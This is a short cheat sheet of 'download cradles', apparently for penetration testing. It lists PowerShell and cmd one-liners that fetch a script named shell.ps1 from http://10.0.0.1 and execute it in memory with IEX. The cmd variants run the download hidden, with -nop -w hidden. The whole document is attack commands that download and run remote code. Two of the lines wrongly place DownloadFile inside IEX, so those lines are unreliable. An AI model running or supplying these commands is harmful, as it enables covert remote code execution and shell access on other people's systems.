# Download Cradles

## PowerShell
`IEX(iwr 'http://10.0.0.1/shell.ps1')`
`IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')`
`IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/shell.ps1','shell.ps1')`

## cmd
`powershell.exe -nop -w hidden -c "IEX(iwr 'http://10.0.0.1/shell.ps1')"`
`powershell.exe -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1'))"`
`powershell.exe -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadFile('http://10.0.0.1/shell.ps1','shell.ps1'))"`

